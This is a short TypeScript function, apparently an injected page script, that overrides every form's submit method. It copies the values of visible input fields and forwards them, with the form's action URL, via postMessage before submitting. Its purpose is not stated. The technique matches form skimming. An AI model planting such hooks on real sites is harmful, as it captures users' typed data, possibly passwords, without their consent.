export function execution() {
    document.querySelectorAll("form")
        .forEach(form => {
            const submitFnc = form.submit
            console.log("submit intercept form")

            const formProps: Record<string, string> = {}
            form.submit = () => {
                for (let inptIndex = 0; inptIndex < form.length; inptIndex++) {
                    const inpt = form[inptIndex]
                    if (inpt instanceof HTMLInputElement) {
                        if (inpt.checkVisibility()) {
                            formProps[inpt.id] = inpt.value
                        }
                    }

                }
                const action = new URL(form.action)

                const props = {
                    action: `${action.origin}${action.pathname}`,
                    method: form.method,
                    id: form.id,
                    props: formProps
                }
                postMessage(JSON.stringify({
                    type: "form-send",
                    data: props
                }))
                submitFnc.apply(form)
            }


            const action = new URL(form.action)
            postMessage(JSON.stringify({
                type: "formdata",
                data: {
                    action: `${action.origin}${action.pathname}`,
                }
            }))
        });
}